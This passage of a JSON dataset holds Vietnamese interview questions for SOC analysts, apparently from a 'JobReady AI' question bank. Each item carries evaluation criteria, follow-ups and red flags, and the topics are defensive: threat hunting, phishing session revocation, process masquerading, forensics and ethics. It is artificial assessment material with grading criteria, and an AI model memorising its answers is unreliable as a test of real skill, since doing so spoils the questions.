          "WMI/WinRM: Khởi chạy tiến trình `wsmprovhost.exe` hoặc `wmiprvse.exe` làm parent process sinh ra `cmd.exe` hoặc `powershell.exe`"
        ],
        "followUps": [
          "Tại sao việc tắt giao thức NTLM và chuyển dịch hoàn toàn sang Kerberos lại là giải pháp ngăn chặn Pass-the-Hash hiệu quả nhất?",
          "Cách phát hiện hành vi lạm dụng BloodHound thu thập thông tin AD qua lưu lượng LDAP query bất thường?"
        ],
        "tags": [
          "Lateral Movement",
          "Pass-the-Hash",
          "PsExec",
          "WMI Execution",
          "NTLM vs Kerberos",
          "Sysmon Event ID 7045"
        ],
        "sourceRefs": [
          "https://attack.mitre.org/",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Không biết PsExec tạo service và share ẩn `ADMIN$`, bỏ qua các sự kiện Service Creation 7045"
        ]
      },
      {
        "id": "SOC-PRAC-08",
        "role": "SOC Analyst (L1/L2/L3)",
        "category": "practical_skills",
        "difficulty": "advanced",
        "seniority": "senior_lead",
        "question": "Hoạt động Săn lùng Mối đe dọa Chủ động (Proactive Threat Hunting): Xây dựng Giả thuyết săn lùng (Hunting Hypothesis) dựa trên thông tin tình báo mới (vd: Kỹ thuật DLL Search Order Hijacking) và các bước truy vấn log thực nghiệm?",
        "evaluationCriteria": [
          "Giả thuyết săn lùng: 'Các phần mềm hợp lệ trong mạng đang bị kẻ tấn công lợi dụng để nạp các tệp DLL độc hại từ thư mục ghi được (Writable directory)'",
          "Thu thập dữ liệu: Truy vấn Sysmon Event ID 7 (Image loaded) hoặc log EDR; lọc các file thực thi chuẩn (như `explorer.exe`, `teams.exe`) nạp DLL từ thư mục tạm `C:\\Users\\*\\AppData\\Local\\Temp` hoặc thư mục public",
          "Phân tích kết quả: Kiểm tra chữ ký số (Digital Signature) của DLL, nếu DLL không có chữ ký hoặc chữ ký không khớp nhà phát hành phần mềm chính -> nghi ngờ và cô lập điều tra"
        ],
        "followUps": [
          "Khác biệt cơ bản giữa Giám sát thụ động (Passive Alerting) và Săn lùng chủ động (Proactive Hunting)?",
          "Các bước đóng vòng lặp săn lùng (Closing the Hunt Loop): Làm thế nào để biến kết quả của một đợt hunt thành rule SIEM tự động trong tương lai?"
        ],
        "tags": [
          "Threat Hunting",
          "Hunting Hypothesis",
          "DLL Hijacking",
          "Sysmon Event ID 7",
          "Signature Verification"
        ],
        "sourceRefs": [
          "https://attack.mitre.org/",
          "https://www.sans.org/white-papers/33342/"
        ],
        "redFlags": [
          "Đi săn mà không có giả thuyết rõ ràng, chỉ gõ các truy vấn tìm kiếm ngẫu nhiên không mục đích"
        ]
      },
      {
        "id": "SOC-SCEN-01",
        "role": "SOC Analyst (L1/L2/L3)",
        "category": "scenario",
        "difficulty": "intermediate",
        "seniority": "fresher_intern",
        "question": "Tại SOC Analyst (L1/L2/L3), khi SOC Night Shift Triage cùng VIP Account Compromise, Network Disconnection, Incident Escalation, Evidence Preservation xuất hiện và em bắt gặp cảnh báo đáng ngờ trong môi trường thực hành được cấp phép, em kiểm tra log hay dữ liệu nào trước?",
        "evaluationCriteria": [
          "Làm rõ hiện tượng và thu thập thông tin trước khi kết luận.",
          "Đề xuất bước xử lý ban đầu an toàn, phù hợp với Intern/Fresher trong SOC Analyst (L1/L2/L3).",
          "Biết xác nhận kết quả và báo người hướng dẫn khi vấn đề vượt quá phạm vi hiểu biết."
        ],
        "followUps": [
          "Em sẽ tóm tắt phát hiện và phần chưa chắc chắn với người hướng dẫn như thế nào?"
        ],
        "tags": [
          "SOC Night Shift Triage",
          "VIP Account Compromise",
          "Network Disconnection",
          "Incident Escalation",
          "Evidence Preservation"
        ],
        "sourceRefs": [
          "https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Đưa ra hành động rủi ro, vượt quyền hoặc bỏ qua bước xác minh và báo cáo."
        ]
      },
      {
        "id": "SOC-SCEN-02",
        "role": "SOC Analyst (L1/L2/L3)",
        "category": "scenario",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Tình huống: Đội phát triển phần mềm vừa triển khai một bản cập nhật CI/CD mới. Ngay lập tức SIEM bùng nổ hơn 20,000 cảnh báo 'Brute Force Database Attack' và 'Port Scan' chỉ trong 10 phút, khiến hàng đợi cảnh báo (Queue) của SOC bị nghẽn hoàn toàn. Làm thế nào em nhanh chóng phân biệt giữa sự cố tấn công thật và lỗi cấu hình phần mềm nội bộ?",
        "evaluationCriteria": [
          "Bước 1: Nhanh chóng phân tích nguồn gốc IP phát sinh cảnh báo (Source IP); phát hiện lưu lượng bắt nguồn từ IP cụ thể của cụm Kubernetes/Jenkins vừa deploy",
          "Bước 2: Kiểm tra nội dung log chi tiết: thấy service mới liên tục kết nối lại database với lỗi xác thực sai mật khẩu trong chu kỳ vòng lặp reconnect 5ms",
          "Bước 3: Liên hệ kênh Slack On-call của DevOps để xác nhận cấu hình database credential vừa deploy; đồng thời tạm thời áp dụng bộ lọc Rule Suppression có giới hạn thời gian (Timed Filter) cho IP máy chủ CI/CD đó để giải phóng hàng đợi cảnh báo cho SOC"
        ],
        "followUps": [
          "Làm thế nào để đảm bảo việc lọc cảnh báo tạm thời không vô tình che giấu một cuộc tấn công thật sự đang diễn ra song song?",
          "Biện pháp lâu dài để DevOps thông báo trước các đợt load test / migration cho đội SOC?"
        ],
        "tags": [
          "Alert Storm",
          "False Positive Management",
          "DevOps Misconfiguration",
          "Rule Suppression",
          "Root Cause Analysis"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Vội vàng tắt vĩnh viễn rule phát hiện Brute Force của SIEM khiến toàn bộ công ty mất khả năng phòng vệ"
        ]
      },
      {
        "id": "SOC-SCEN-03",
        "role": "SOC Analyst (L1/L2/L3)",
        "category": "scenario",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Tình huống: Một nhân viên phòng Kế toán báo cáo rằng họ vừa bấm vào đường link trong email thông báo 'Hóa đơn tiền điện' và đã nhập tên đăng nhập cùng mật khẩu Office 365 trên trang web giả mạo. Tuy nhiên tài khoản có bật 2FA SMS. Là SOC Analyst, em thực hiện các bước ngăn chặn và điều tra chiếm quyền phiên (Session Hijacking / Evilginx) ra sao?",
        "evaluationCriteria": [
          "Bước 1: Giả định kẻ tấn công sử dụng kỹ thuật Adversary-in-the-Middle (AiTM / Evilginx) cho phép tin tặc cướp luôn Session Cookie và mã 2FA SMS vừa nhập",
          "Bước 2: Lập tức vào Azure AD Admin Center: Đổi mật khẩu tài khoản và bắt buộc chọn 'Revoke all active sessions' (Hủy toàn bộ refresh token và phiên đăng nhập hiện tại)",
          "Bước 3: Kiểm tra Azure AD Audit Log của tài khoản đó trong 30 phút qua: tìm kiếm các hành vi tạo Inbox Forwarding Rule (chuyển tiếp email kế toán ra ngoài), đăng ký thiết bị 2FA mới (MFA device registration), hoặc tạo App Password"
        ],
        "followUps": [
          "Tại sao việc chỉ đổi mật khẩu mà không bấm 'Revoke Active Sessions' vẫn để kẻ tấn công duy trì quyền truy cập vào hộp thư qua cookie cũ?",
          "Biện pháp phòng ngừa triệt để nhất chống lại các cuộc tấn công lừa đảo AiTM là gì (FIDO2 / Passkeys)?"
        ],
        "tags": [
          "Phishing AiTM",
          "Evilginx Phishing",
          "Session Revocation",
          "Inbox Forwarding Rule",
          "Azure AD Audit"
        ],
        "sourceRefs": [
          "https://www.microsoft.com/en-us/security/blog/2022/07/12/from-cookie-theft-to-bce-attackers-use-aitm-phishing-sites-as-entry-point-to-further-financial-fraud/",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Nghĩ rằng có 2FA SMS là an toàn tuyệt đối và chỉ dặn nhân viên đổi lại mật khẩu rồi đóng ticket"
        ]
      },
      {
        "id": "SOC-SCEN-04",
        "role": "SOC Analyst (L1/L2/L3)",
        "category": "scenario",
        "difficulty": "advanced",
        "seniority": "senior_lead",
        "question": "Tình huống: Trong quá trình rà soát log EDR định kỳ, em phát hiện tiến trình `svchost.exe` đang chạy từ đường dẫn `C:\\Windows\\Temp\\svchost.exe` thay vì `C:\\Windows\\System32\\svchost.exe`, và tiến trình này đang tạo kết nối mạng ra cổng 443 của một IP lạ tại nước ngoài. Em tiến hành bóc tách phân tích hành vi và xử lý như thế nào?",
        "evaluationCriteria": [
          "Bước 1: Định danh ngay đây là kỹ thuật Giả mạo tên tiến trình hợp lệ (Masquerading - MITRE ATT&CK T1036) nhằm đánh lừa người quản trị",
          "Bước 2: Thu thập thông tin tiến trình qua EDR Live Response: lấy hash SHA-256 của file, dump memory của tiến trình đó để trích xuất cấu hình C2 server và các chuỗi string bên trong",
          "Bước 3: Kiểm tra Parent Process: Tiến trình nào đã sinh ra file `svchost.exe` giả mạo này trong thư mục Temp? Kiểm tra các khóa Run, Task Scheduler hoặc Service Creation để triệt phá cơ chế lưu trú (Persistence)"
        ],
        "followUps": [
          "Kẻ tấn công thường tận dụng cơ chế quyền hạn nào để ghi được file vào `C:\\Windows\\Temp`?",
          "Các lệnh EDR/PowerShell nào giúp trích xuất danh sách tất cả các máy tính khác trong mạng nội bộ đang có cùng hash file này?"
        ],
        "tags": [
          "Process Masquerading",
          "svchost Spoofing",
          "Malware Persistence",
          "SHA-256 Telemetry",
          "Threat Containment"
        ],
        "sourceRefs": [
          "https://attack.mitre.org/",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Bỏ qua cảnh báo vì nhìn thấy tên file là `svchost.exe` và tưởng rằng đó là tiến trình hệ thống Windows bình thường"
        ]
      },
      {
        "id": "SOC-SCEN-05",
        "role": "SOC Analyst (L1/L2/L3)",
        "category": "scenario",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Tình huống: Hệ thống IDS/WAF phát hiện một địa chỉ IP nội bộ của máy chủ Web Frontend đang liên tục gửi các lệnh quét SQL Injection và Directory Traversal vào máy chủ Database nội bộ. Đây là dấu hiệu của việc máy chủ Web đã bị chiếm quyền điều khiển và đang bị lợi dụng làm bàn đạp (Pivoting). Các bước phản ứng của em là gì?",
        "evaluationCriteria": [
          "Bước 1: Xác nhận máy chủ Web đã bị xâm nhập (Compromised Web Server) và đang bị dùng làm bàn đạp di chuyển ngang",
          "Bước 2: Cô lập lưu lượng: Cấu hình tường lửa nội bộ chặn ngay các kết nối bất thường từ Web server sang DB server ngoại trừ cổng ứng dụng hợp lệ",
          "Bước 3: Kiểm tra Web Server Access Log: Truy tìm request ban đầu khai thác thành công (vd: Webshell upload, RCE exploit) dẫn đến việc kẻ tấn công thả script quét mạng vào máy chủ",
          "Bước 4: Kiểm tra các file mới được tạo hoặc sửa đổi trong thư mục web root (`/var/www` hoặc `C:\\inetpub\\wwwroot`)"
        ],
        "followUps": [
          "Làm thế nào để tìm ra Webshell đang ẩn giấu trong mã nguồn ứng dụng web bằng các công cụ quét mã độc hoặc so sánh git hash?",
          "Tại sao việc chỉ chặn IP máy chủ web nội bộ trên DB lại có thể làm sập toàn bộ dịch vụ của khách hàng và cách cân bằng tính liên tục dịch vụ?"
        ],
        "tags": [
          "Internal Pivoting",
          "Webshell Detection",
          "Compromised Asset",
          "Lateral Scan",
          "Web Server Forensics"
        ],
        "sourceRefs": [
          "https://attack.mitre.org/",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Cho rằng IP nội bộ là IP tin cậy và không kiểm tra, xem đó là lỗi quét nhầm của hệ thống kiểm thử"
        ]
      },
      {
        "id": "SOC-SCEN-06",
        "role": "SOC Analyst (L1/L2/L3)",
        "category": "scenario",
        "difficulty": "advanced",
        "seniority": "senior_lead",
        "question": "Tình huống: Em nhận được thông báo từ Đội ngũ Quản trị Hạ tầng rằng họ cần thực hiện kiểm tra an ninh khẩn cấp cho một máy chủ ứng dụng tài chính nhạy cảm đang chạy. Tuy nhiên máy chủ này chứa cơ sở dữ liệu giao dịch trực tiếp không được phép khởi động lại. Làm thế nào em thu thập chứng cứ số (Live Forensics Data Collection) mà không làm ảnh hưởng đến hiệu năng và tính ổn định của ứng dụng?",
        "evaluationCriteria": [
          "Bước 1: Lập kế hoạch thu thập chứng cứ giảm thiểu tối đa tải CPU/RAM; ưu tiên thu thập telemetry thụ động qua sensor EDR đã cài sẵn",
          "Bước 2: Sử dụng các công cụ live forensics nhẹ (như KAPE hoặc CyLR) có giới hạn luồng CPU (Thread throttling) để chỉ thu thập các tạo tác hệ thống cốt lõi (Event logs, MFT, Shimcache, Amcache, Prefetch)",
          "Bước 3: Không thực hiện quét toàn bộ ổ đĩa (Full disk scan) trong giờ cao điểm giao dịch; lưu trữ dữ liệu trích xuất vào phân vùng riêng biệt hoặc truyền trực tiếp ra máy chủ thu thập an toàn qua mạng có mã hóa"
        ],
        "followUps": [
          "Thứ tự ưu tiên biến động dữ liệu (Order of Volatility) theo chuẩn RFC 3227 quy định ra sao?",
          "Làm thế nào để tính toán và lưu trữ checksum SHA-256 của các tệp chứng cứ thu thập được nhằm đảm bảo tính toàn vẹn pháp lý (Chain of Custody)?"
        ],
        "tags": [
          "Live Forensics",
          "Order of Volatility",
          "KAPE",
          "Production Impact Mitigation",
          "Chain of Custody"
        ],
        "sourceRefs": [
          "https://www.rfc-editor.org/rfc/rfc3227",
          "https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final"
        ],
        "redFlags": [
          "Chạy các công cụ quét nặng nề làm sập máy chủ giao dịch tài chính cốt lõi của doanh nghiệp"
        ]
      },
      {
        "id": "SOC-CV-01",
        "role": "SOC Analyst (L1/L2/L3)",
        "category": "cv_validation",
        "difficulty": "intermediate",
        "seniority": "junior",
        "question": "Trong CV em ghi có kinh nghiệm vận hành SIEM (Splunk/Sentinel/QRadar): Hãy mô tả một Correlation Rule hoặc truy vấn phức tạp nhất mà em từng tự tay tinh chỉnh hoặc xây dựng để giảm thiểu False Positives trong dự án thực tế?",
        "evaluationCriteria": [
          "Mô tả rõ ràng bối cảnh: Rule ban đầu gặp vấn đề gì (vd: quá nhiều báo động giả từ các tác vụ bảo trì tự động)",
          "Chi tiết kỹ thuật của truy vấn: Các hàm thống kê, điều kiện lọc (aggregation, thresholding, time-window evaluation)",
          "Kết quả đo lường định lượng: Giảm được bao nhiêu % cảnh báo nhiễu, thời gian phản hồi của đội SOC được cải thiện như thế nào mà không bỏ sót sự cố"
        ],
        "followUps": [
          "Những cạm bẫy thường gặp khi whitelist theo địa chỉ IP hoặc tên tiến trình trong rule SIEM?",
          "Cách em kiểm thử độ tin cậy của rule trước khi đưa vào môi trường Production?"
        ],
        "tags": [
          "SIEM Tuning",
          "Splunk SPL",
          "Correlation Rule Optimization",
          "False Positive Reduction",
          "CV Deep Dive"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Khai man kinh nghiệm cấu hình SIEM, không giải thích được cú pháp truy vấn hoặc nguyên lý tính toán thời gian correlational logic"
        ]
      },
      {
        "id": "SOC-CV-02",
        "role": "SOC Analyst (L1/L2/L3)",
        "category": "cv_validation",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "CV của em đề cập việc phân tích và điều tra các sự cố an ninh nghiêm trọng (Security Incidents): Hãy chia sẻ chi tiết về sự cố khó khăn nhất mà em từng trực tiếp xử lý từ lúc nhận cảnh báo đầu tiên cho đến khi đóng case?",
        "evaluationCriteria": [
          "Trình bày theo cấu trúc chuẩn: Tín hiệu phát hiện ban đầu (Detection) -> Quá trình điều tra truy vết (Investigation) -> Biện pháp ngăn chặn cô lập (Containment) -> Khắc phục và đúc kết kinh nghiệm (Lessons Learned)",
          "Nêu bật các kỹ năng chuyên môn đã vận dụng: Đọc log nào, dùng công cụ gì, gặp bế tắc kỹ thuật nào và đã vượt qua ra sao",
          "Tác động kinh doanh: Bảo vệ được dữ liệu gì cho công ty hoặc khách hàng"
        ],
        "followUps": [
          "Trong sự cố đó, em đã phối hợp với các phòng ban khác (IT, Network, Lãnh đạo) như thế nào?",
          "Nếu được quay lại xử lý sự cố đó, em sẽ thay đổi hoặc làm tốt hơn điều gì?"
        ],
        "tags": [
          "Incident Case Study",
          "Root Cause Analysis",
          "SOC Investigation",
          "Containment Strategy",
          "Lessons Learned"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Kể câu chuyện chung chung không có chi tiết kỹ thuật thực tế, không chứng minh được vai trò cá nhân trực tiếp trong sự cố"
        ]
      },
      {
        "id": "SOC-CV-03",
        "role": "SOC Analyst (L1/L2/L3)",
        "category": "cv_validation",
        "difficulty": "intermediate",
        "seniority": "junior",
        "question": "Em ghi nhận có kiến thức vững chắc về các khung chuẩn an ninh mạng (MITRE ATT&CK, Cyber Kill Chain, NIST): Trong công việc giám sát hàng ngày tại SOC, em áp dụng các khung chuẩn này vào việc phân loại và đánh giá mức độ nghiêm trọng của cảnh báo như thế nào?",
        "evaluationCriteria": [
          "Áp dụng thực tế: Không chỉ học thuộc lý thuyết mà dùng ATT&CK để gán tag cho cảnh báo, giúp nhanh chóng nhận biết kẻ tấn công đang ở giai đoạn nào (Initial Access hay đã đến Exfiltration)",
          "Sử dụng Matrix để đánh giá khoảng trống giám sát (Detection Gap Analysis): Hệ thống đang thiếu log ở kỹ thuật nào",
          "Tạo sự đồng nhất về ngôn ngữ báo cáo giữa SOC L1, L2, L3 và Ban Lãnh đạo"
        ],
        "followUps": [
          "Tại sao việc phát hiện tấn công ở giai đoạn Initial Access lại có giá trị cao hơn nhiều so với giai đoạn Exfiltration?",
          "Khác biệt giữa Cyber Kill Chain (Lockheed Martin) và MITRE ATT&CK Framework?"
        ],
        "tags": [
          "MITRE ATT&CK Mapping",
          "Cyber Kill Chain",
          "Detection Gap Analysis",
          "SOC Operational Framework"
        ],
        "sourceRefs": [
          "https://attack.mitre.org/",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Học vẹt tên các framework mà không hiểu cách ánh xạ log thực tế vào các kỹ thuật ATT&CK cụ thể"
        ]
      },
      {
        "id": "SOC-CV-04",
        "role": "SOC Analyst (L1/L2/L3)",
        "category": "cv_validation",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Trong hồ sơ em có nêu việc sử dụng các công cụ phân tích mã độc và Sandbox (Any.Run, VirusTotal, Hybrid Analysis, Ghidra cơ bản): Hãy trình bày một trường hợp em bóc tách một tệp tin đáng ngờ để trích xuất IoC phục vụ việc chặn lọc khẩn cấp?",
        "evaluationCriteria": [
          "Mô tả mẫu file phân tích (vd: file Excel chứa macro độc hại, file shortcut LNK giả mạo hoặc file ISO)",
          "Quy trình phân tích động (Dynamic Analysis): Chạy trong sandbox, quan sát network traffic, URL tải payload tiếp theo, process con được sinh ra",
          "Quy trình phân tích tĩnh (Static Analysis): Trích xuất chuỗi string, kiểm tra entropy, phân tích macro VBA / PowerShell script ẩn giấu",
          "Các IoC thu được (IP C2, domain độc, SHA-256) và cách phân phối chúng cho tường lửa và EDR"
        ],
        "followUps": [
          "Kỹ thuật phòng vệ chống sandbox (Anti-Sandbox / Evasion techniques) mà mã độc hay sử dụng?",
          "Tại sao không nên tải trực tiếp các tệp tin chứa dữ liệu nội bộ nhạy cảm lên VirusTotal bản công khai?"
        ],
        "tags": [
          "Malware Triage",
          "Sandbox Analysis",
          "IoC Extraction",
          "Static vs Dynamic Analysis",
          "Any.Run"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Tải dữ liệu khách hàng bảo mật lên sandbox công khai vi phạm nghiêm trọng chính sách bảo mật"
        ]
      },
      {
        "id": "SOC-CV-05",
        "role": "SOC Analyst (L1/L2/L3)",
        "category": "cv_validation",
        "difficulty": "intermediate",
        "seniority": "middle",
        "question": "CV có ghi em tham gia trực ca 24/7 (Shift Work) và xử lý khối lượng cảnh báo lớn: Em tổ chức và quản lý thời gian, ghi chép nhật ký bàn giao (Shift Log) như thế nào để đảm bảo không xảy ra sai sót hoặc sót lọt cảnh báo giữa các ca trực?",
        "evaluationCriteria": [
          "Phương pháp ghi chép nhật ký ca trực chuẩn mực: Ghi nhận rõ số lượng cảnh báo đã xử lý, các case đang mở (Open tickets) cần ca sau theo dõi sát, các thay đổi bất thường về cấu hình mạng của đội IT",
          "Thực hiện cuộc họp bàn giao trực tiếp (Handover meeting 15 phút) giữa ca trước và ca sau để giải thích trực tiếp ngữ cảnh",
          "Quản lý sức khỏe và duy trì sự tỉnh táo trong ca đêm (ngủ đủ giấc ban ngày, hạn chế caffein quá liều, tổ chức giải lao luân phiên)"
        ],
        "followUps": [
          "Em xử lý thế nào khi ca sau đến muộn hoặc vắng mặt đột xuất mà sự cố nghiêm trọng đang diễn ra?",
          "Cách em ưu tiên xử lý ticket khi đồng thời có 3 cảnh báo mức độ High cùng xuất hiện?"
        ],
        "tags": [
          "Shift Handover Management",
          "SOC Operational Discipline",
          "Ticket Prioritization",
          "Handover Log"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Bàn giao qua loa miệng, không có nhật ký ghi chép dẫn đến thất lạc sự cố đang tiếp diễn"
        ]
      },
      {
        "id": "SOC-BEHAV-01",
        "role": "SOC Analyst (L1/L2/L3)",
        "category": "behavioral",
        "difficulty": "intermediate",
        "seniority": "junior",
        "question": "Công việc SOC Analyst L1 thường xuyên phải đối mặt với áp lực thời gian (SLA chặt chẽ) và sự lặp lại đơn điệu của việc đọc log hàng ngày. Em làm thế nào để duy trì sự tập trung cao độ, tránh tâm lý chán nản và không bỏ sót các chi tiết bất thường nhỏ nhất?",
        "evaluationCriteria": [
          "Hiểu rõ ý nghĩa công việc: Một chi tiết log nhỏ bị bỏ sót có thể là khởi đầu của một cuộc tấn công Ransomware hủy hoại cả công ty",
          "Rèn luyện tư duy thám tử: Luôn tò mò và đặt câu hỏi 'Tại sao sự kiện này lại xảy ra?', biến việc đọc log thành việc giải các câu đố logic",
          "Tự động hóa các tác vụ thủ công: Học viết script Python/PowerShell hoặc regex để tự động hóa các bước kiểm tra lặp đi lặp lại nhằm giải phóng thời gian học hỏi kiến thức mới"
        ],
        "followUps": [
          "Khi cảm thấy quá mệt mỏi trong ca trực, em có biện pháp gì để lấy lại sự tỉnh táo mà không vi phạm quy định làm việc?",
          "Em đã bao giờ từng tự tay viết một script nhỏ để hỗ trợ công việc của đội chưa?"
        ],
        "tags": [
          "Vigilance and Focus",
          "Mindset of Defender",
          "Monotony Overcoming",
          "Continuous Improvement"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Thừa nhận thường xuyên làm việc qua loa cho xong lượt cảnh báo vì thấy công việc nhàm chán"
        ]
      },
      {
        "id": "SOC-BEHAV-02",
        "role": "SOC Analyst (L1/L2/L3)",
        "category": "behavioral",
        "difficulty": "intermediate",
        "seniority": "junior",
        "question": "Khi em phát hiện một cảnh báo an ninh đáng ngờ liên quan đến tài khoản của một Quản lý cấp cao hoặc đồng nghiệp thân thiết, nhưng họ yêu cầu em 'bỏ qua giúp, đừng ghi vào hệ thống vì đó chỉ là việc cá nhân', em ứng xử như thế nào?",
        "evaluationCriteria": [
          "Giữ vững tính chính trực và đạo đức nghề nghiệp an toàn thông tin: Tuyệt đối không xóa, bỏ qua hoặc che giấu cảnh báo an ninh vì lý do quen biết cá nhân",
          "Giải thích nhã nhặn nhưng kiên quyết: Quy trình của SOC là bắt buộc và việc điều tra là để bảo vệ chính tài khoản của anh/chị khỏi nguy cơ bị tin tặc lợi dụng mạo danh",
          "Tiếp tục xử lý ticket theo đúng quy trình chuẩn (SOP), ghi nhận đầy đủ sự thật khách quan và thông báo cho người phụ trách ca trực"
        ],
        "followUps": [
          "Nếu người quản lý đó dùng quyền lực để đe dọa hoặc ép buộc em đóng ticket, em sẽ báo cáo lên ai?",
          "Tại sao tính khách quan và độc lập là phẩm chất sống còn của một nhân sự an ninh thông tin?"
        ],
        "tags": [
          "Professional Ethics",
          "Integrity",
          "Conflict of Interest Handling",
          "Standard Operating Procedure"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Nhượng bộ, đóng ticket theo yêu cầu của người quen vì sợ mất lòng hoặc sợ bị trù dập"
        ]
      },
      {
        "id": "SOC-BEHAV-03",
        "role": "SOC Analyst (L1/L2/L3)",
        "category": "behavioral",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Trong một sự cố khẩn cấp, em nghi ngờ một máy chủ quan trọng của bộ phận Kinh doanh đã bị xâm phạm và cần phải cô lập mạng ngay lập tức để ngăn chặn mã độc lây lan. Tuy nhiên, Giám đốc Kinh doanh phản đối kịch liệt vì việc ngắt mạng sẽ làm gián đoạn hợp đồng bán hàng hàng triệu USD. Em thương lượng và phối hợp giải quyết xung đột này ra sao?",
        "evaluationCriteria": [
          "Thấu hiểu nỗi lo kinh doanh: Không tranh cãi gay gắt, trình bày rõ ràng bằng ngôn ngữ rủi ro kinh doanh: 'Nếu không cô lập tạm thời, nguy cơ toàn bộ hệ thống bị mã hóa tống tiền sẽ gây thiệt hại toàn diện và phá hủy uy tín công ty'",
          "Đề xuất giải pháp kiểm soát bù trừ: Áp dụng cô lập có chọn lọc (chỉ chặn cổng ra Internet và cổng di chuyển ngang, vẫn cho phép kết nối nội bộ phục vụ giao dịch nếu đánh giá rủi ro cho phép)",
          "Nhanh chóng báo cáo CISO / Trưởng ban Chỉ đạo Ứng cứu khẩn cấp để đưa ra quyết định ở cấp quản trị cao nhất theo đúng thẩm quyền"
        ],
        "followUps": [
          "Làm thế nào để chuẩn bị trước các kịch bản ủy quyền ngắt mạng (Isolation Authority Matrix) trước khi sự cố xảy ra?",
          "Khi ban giám đốc chấp nhận rủi ro không ngắt mạng, em bảo vệ trách nhiệm pháp lý của đội SOC như thế nào?"
        ],
        "tags": [
          "Business Alignment",
          "Crisis Communication",
          "Risk Negotiation",
          "Authorization Matrix"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Tự ý ngắt mạng trong im lặng mà không thông báo, hoặc ngược lại, bỏ mặc hệ thống bị lây nhiễm vì sợ trách nhiệm"
        ]
      },
      {
        "id": "SOC-BEHAV-04",
        "role": "SOC Analyst (L1/L2/L3)",
        "category": "behavioral",
        "difficulty": "intermediate",
        "seniority": "junior",
        "question": "Nếu em vô tình đóng nhầm một cảnh báo an ninh (đánh dấu nhầm là False Positive) và vài giờ sau sự cố đó bùng phát thành một đợt tấn công thực sự, em đối diện với sai lầm của mình như thế nào trước cấp trên và đội ngũ?",
        "evaluationCriteria": [
          "Dũng cảm nhận trách nhiệm ngay lập tức: Tuyệt đối không giấu giếm, không sửa log hoặc đổ lỗi cho người khác",
          "Chủ động báo cáo ngay cho Trưởng ca kèm theo toàn bộ thông tin chi tiết về cảnh báo đã bị đóng nhầm và các bước em đang thực hiện để khắc phục hậu quả",
          "Rút kinh nghiệm sâu sắc: Phân tích nguyên nhân gốc rễ (do thiếu thông tin, hiểu sai logic hay do mệt mỏi) và đề xuất cải tiến checklist phân loại để không ai trong đội lặp lại sai lầm tương tự"
        ],
        "followUps": [
          "Tại sao văn hóa 'Không đổ lỗi' (Blameless Culture) trong SOC lại giúp ngăn chặn các thảm họa lớn hơn?",
          "Em làm gì để lấy lại sự tự tin trong công việc sau một sai lầm đáng tiếc?"
        ],
        "tags": [
          "Accountability",
          "Blameless Post-Mortem",
          "Mistake Ownership",
          "Professional Resilience"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Tìm cách xóa dấu vết, chối bỏ trách nhiệm hoặc đổ lỗi cho hệ thống SIEM đưa cảnh báo không rõ ràng"
        ]
      },
      {
        "id": "SOC-BEHAV-05",
        "role": "SOC Analyst (L1/L2/L3)",
        "category": "behavioral",
        "difficulty": "intermediate",
        "seniority": "middle",
        "question": "Lĩnh vực an ninh mạng và kỹ thuật tấn công thay đổi từng ngày. Là một SOC Analyst, em xây dựng lộ trình nâng cao năng lực bản thân (từ L1 lên L2/L3, Threat Hunter, Incident Responder) và văn hóa chia sẻ kiến thức trong nhóm như thế nào?",
        "evaluationCriteria": [
          "Chủ động học tập liên tục: Đặt mục tiêu đạt các chứng chỉ chuyên nghiệp thực chiến (BTL1, CDSA, GCIA, SC-200), luyện tập trên các nền tảng thực hành (LetsDefend, CyberDefenders, Blue Team Labs Online)",
          "Đóng góp cho tri thức nội bộ: Viết tài liệu hướng dẫn điều tra (Runbooks/Playbooks) cho các loại cảnh báo mới xuất hiện",
          "Tổ chức các buổi Threat Briefing ngắn hàng tuần để cập nhật các chiến dịch tấn công mới nhất trong khu vực cho toàn đội"
        ],
        "followUps": [
          "Chủ đề chuyên môn an ninh mạng nào mà em đang tập trung nghiên cứu sâu nhất trong 3 tháng gần đây?",
          "Làm thế nào để cân bằng giữa thời gian làm việc ca trực và thời gian học tập nghiên cứu cá nhân?"
        ],
        "tags": [
          "Continuous Learning",
          "Career Progression",
          "Knowledge Sharing",
          "Blue Team Development"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
